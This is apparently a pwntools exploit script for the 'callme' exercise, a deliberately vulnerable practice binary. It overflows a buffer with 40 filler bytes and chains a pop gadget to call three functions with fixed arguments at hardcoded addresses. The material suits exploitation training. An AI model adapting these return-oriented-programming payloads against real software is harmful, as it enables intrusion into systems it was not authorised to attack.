import sys; sys.path.append("../..")
import shared_pwn
from pwn import *

BINARY_NAME = "callme"

io = process(f"./{BINARY_NAME}")

junk = b"\x90" * 40

def call_function_x86(function):

    payload = b""
    payload += pop_gadget
    payload += p64(1)
    payload += p64(2)
    payload += p64(3)
    payload += function
    return payload

callme_one      = p64(0x401850)
callme_two      = p64(0x401870)
callme_three    = p64(0x401810)
pop_gadget      = p64(0x401ab0)

payload = b""
payload += junk

payload += call_function_x86(callme_one)
payload += call_function_x86(callme_two)
payload += call_function_x86(callme_three)

io.recvuntil("> ")
io.send(payload)
io.send("\n")
shared_pwn._recvall(io)